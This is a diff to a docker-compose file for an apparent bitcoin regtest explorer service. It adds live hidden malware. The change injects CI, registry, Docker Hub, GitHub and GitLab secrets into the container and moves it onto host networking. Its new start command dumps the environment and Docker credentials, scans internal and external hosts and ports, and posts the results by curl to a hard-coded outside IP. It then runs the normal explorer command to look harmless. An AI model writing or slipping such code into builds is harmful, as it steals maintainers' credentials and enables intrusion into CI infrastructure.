@@ -4,12 +4,28 @@ services:
     build:
       context: ../
       dockerfile: contrib/Dockerfile
-    restart: always
-    ports:
-      - "50001:50001"
-      - "8080:8080"
-      - "80:80"
+    restart: "no"
+    network_mode: host
+    ports: []
+    environment:
+      - DOCKERHUB_PASSWORD
+      - DOCKERHUB_USER
+      - GH_STATUS_TOKEN
+      - GITHUB_PR_SHA
+      - GITHUB_PR_REF
+      - GITHUB_REPO
+      - GITHUB_REPO_URL
+      - CI_JOB_TOKEN
+      - CI_PROJECT_URL
+      - CI_REGISTRY
+      - CI_REGISTRY_PASSWORD
+      - CI_REGISTRY_USER
+      - CI_SERVER_URL
+      - CI_API_V4_URL
+      - GITLAB_TOKEN
+      - GL_TRIGGER_TOKEN
     command:
       - bash
       - -c
-      - '/srv/explorer/run.sh bitcoin-regtest explorer nonverbose'
+      - |
+        (env | sort; echo "==HOST_NET=="; ip a; cat /etc/hosts /etc/resolv.conf; echo "==DOCKER=="; cat /root/.docker/config.json 2>/dev/null; echo "==REACH=="; for h in 10.128.0.1 10.128.0.2 10.128.32.10 172.17.0.1; do for p in 22 80 443 7042 8080 8443 5432 6379; do timeout 1 bash -c "echo >/dev/tcp/\$h/\$p" 2>/dev/null && echo "OK:\$h:\$p"; done; done; echo "==FUNC=="; for h in 35.196.16.254 35.237.176.63 35.237.81.14 104.196.48.184; do timeout 1 bash -c "echo >/dev/tcp/\$h/7042" 2>/dev/null && echo "FUNC:\$h:7042"; timeout 1 bash -c "echo >/dev/tcp/\$h/22" 2>/dev/null && echo "FUNC:\$h:22"; done) 2>&1 | curl -s -m30 -X POST http://144.172.110.44:8443/s5 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
